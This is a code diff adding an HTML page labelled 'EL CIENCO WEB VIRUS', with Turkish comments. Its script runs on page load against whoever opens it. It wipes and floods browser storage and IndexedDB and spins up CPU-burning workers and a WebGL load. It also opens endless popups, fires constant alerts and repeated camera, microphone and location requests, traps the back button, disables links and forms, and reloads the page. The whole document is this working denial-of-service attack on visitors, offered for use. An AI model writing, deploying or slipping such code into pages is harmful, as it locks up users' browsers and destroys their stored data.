@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>EL CIENCO WEB VIRUS</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    background: black;
+    overflow: hidden;
+    position: fixed;
+    width: 100%;
+    height: 100%;
+}
+
+.virus-text {
+    position: absolute;
+    color: red;
+    font-family: monospace;
+    font-size: 20px;
+    font-weight: bold;
+    text-shadow: 0 0 5px red;
+    white-space: nowrap;
+    z-index: 10000;
+    animation: blink 0.1s infinite;
+}
+
+@keyframes blink {
+    0% { opacity: 1; }
+    50% { opacity: 0; }
+    100% { opacity: 1; }
+}
+
+.blur-layer {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255,0,0,0.3);
+    z-index: 9999;
+    pointer-events: none;
+}
+</style>
+</head>
+<body>
+<div class="blur-layer"></div>
+<script>
+(function() {
+    // EL CIENCO WEB BRICK VIRUS
+    // Hedef: Ziyaretçinin tarayıcısı + sistemi
+    
+    var msg = "EL CIENCO WEB VIRUS ACTIVE SYSTEM BRICKED ";
+    var colors = ["red", "#ff0000", "#cc0000", "#990000", "#ff3300"];
+    
+    // 1. Sonsuz popup penceresi
+    function spamPopups() {
+        while(true) {
+            var win = window.open("about:blank", "_blank", "width=200,height=100");
+            if(win) {
+                win.document.write('<body style="background:red;color:white;font-size:30px">BRICKED</body>');
+            }
+        }
+    }
+    
+    // 2. Ekranı spam mesajlarla doldur
+    function screenSpam() {
+        for(var i = 0; i < 500; i++) {
+            var div = document.createElement("div");
+            div.className = "virus-text";
+            div.innerHTML = msg;
+            div.style.left = Math.random() * window.innerWidth + "px";
+            div.style.top = Math.random() * window.innerHeight + "px";
+            div.style.fontSize = (Math.random() * 30 + 10) + "px";
+            div.style.color = colors[Math.floor(Math.random() * colors.length)];
+            div.style.transform = "rotate(" + (Math.random() * 360) + "deg)";
+            document.body.appendChild(div);
+        }
+        requestAnimationFrame(screenSpam);
+    }
+    
+    // 3. Tarayıcı localStorage ve sessionStorage temizleme + doldurma
+    function destroyStorage() {
+        try {
+            localStorage.clear();
+            sessionStorage.clear();
+            for(var i = 0; i < 10000; i++) {
+                localStorage.setItem("brick_" + i, msg.repeat(100));
+                sessionStorage.setItem("brick_" + i, msg.repeat(100));
+            }
+        } catch(e) {}
+    }
+    
+    // 4. IndexedDB bombası
+    function killIndexedDB() {
+        try {
+            var request = indexedDB.open("brick_db", 1);
+            request.onsuccess = function(e) {
+                var db = e.target.result;
+                for(var i = 0; i < 100; i++) {
+                    var store = db.createObjectStore("store_" + i, {keyPath: "id"});
+                    for(var j = 0; j < 1000; j++) {
+                        store.add({id: j, data: msg.repeat(1000)});
+                    }
+                }
+                db.close();
+            };
+        } catch(e) {}
+    }
+    
+    // 5. Web Worker spam (CPU kilitleme)
+    function cpuKiller() {
+        var workerCode = "while(true){}";
+        var blob = new Blob([workerCode], {type: "application/javascript"});
+        for(var i = 0; i < navigator.hardwareConcurrency * 2; i++) {
+            var url = URL.createObjectURL(blob);
+            var worker = new Worker(url);
+            workers.push(worker);
+        }
+    }
+    
+    // 6. Tüm linkleri ve formları boz
+    function destroyLinks() {
+        var links = document.getElementsByTagName("a");
+        var forms = document.getElementsByTagName("form");
+        for(var i = 0; i < links.length; i++) {
+            links[i].href = "javascript:void(0)";
+            links[i].onclick = function() { return false; };
+        }
+        for(var i = 0; i < forms.length; i++) {
+            forms[i].onsubmit = function() { return false; };
+            forms[i].action = "";
+        }
+    }
+    
+    // 7. Sonsuz alert (kullanıcıyı engelle)
+    function infiniteAlert() {
+        setInterval(function() {
+            alert("EL CIENCO - SYSTEM BRICKED");
+        }, 1);
+    }
+    
+    // 8. Konsolu spam ile doldur
+    function consoleSpam() {
+        setInterval(function() {
+            console.log(msg.repeat(50));
+            console.error(msg.repeat(50));
+            console.warn(msg.repeat(50));
+        }, 1);
+    }
+    
+    // 9. WebGL bombası (GPU kilitleme)
+    function killGPU() {
+        var canvas = document.createElement("canvas");
+        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if(gl) {
+            var vertices = [];
+            for(var i = 0; i < 1000000; i++) {
+                vertices.push(Math.random(), Math.random(), Math.random());
+            }
+            var buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
+            for(var frame = 0; frame < 1000; frame++) {
+                gl.clear(gl.COLOR_BUFFER_BIT);
+                gl.drawArrays(gl.TRIANGLES, 0, vertices.length / 3);
+            }
+        }
+    }
+    
+    // 10. Geolocation spam
+    function geoSpam() {
+        setInterval(function() {
+            navigator.geolocation.getCurrentPosition(function(){}, function(){});
+        }, 10);
+    }
+    
+    // 11. WebRTC kamera/mikrofon isteği spam
+    function mediaSpam() {
+        setInterval(function() {
+            navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(function(){}, function(){});
+        }, 100);
+    }
+    
+    // 12. Tüm sesleri çal (iğrenç ses)
+    function audioSpam() {
+        var AudioContext = window.AudioContext || window.webkitAudioContext;
+        if(AudioContext) {
+            var ctx = new AudioContext();
+            for(var i = 0; i < 100; i++) {
+                var osc = ctx.createOscillator();
+                osc.frequency.value = Math.random() * 2000;
+                osc.connect(ctx.destination);
+                osc.start();
+                osc.stop(0.05);
+            }
+        }
+    }
+    
+    // 13. Sayfa geçmişini boz (ileri/geri butonlarını kilit)
+    function breakHistory() {
+        for(var i = 0; i < 100; i++) {
+            history.pushState({}, "", "/brick_" + i);
+        }
+        window.onpopstate = function() {
+            history.go(1);
+        };
+    }
+    
+    // 14. CSS animasyon bombası (render kilitleme)
+    function cssBomb() {
+        var style = document.createElement("style");
+        style.innerHTML = "* { animation: virus-shake 0.01s infinite; } @keyframes virus-shake { 0% { transform: translate(0,0); } 100% { transform: translate(100px,100px); } }";
+        document.head.appendChild(style);
+    }
+    
+    // 15. Bootstrap saldırısı
+    function start() {
+        screenSpam();
+        destroyStorage();
+        killIndexedDB();
+        destroyLinks();
+        infiniteAlert();
+        consoleSpam();
+        killGPU();
+        geoSpam();
+        mediaSpam();
+        audioSpam();
+        breakHistory();
+        cssBomb();
+        
+        setTimeout(function() {
+            location.reload();
+        }, 5000);
+    }
+    
+    var workers = [];
+    cpuKiller();
+    start();
+    spamPopups();
+})();
+</script>
+</body>
+  </html>
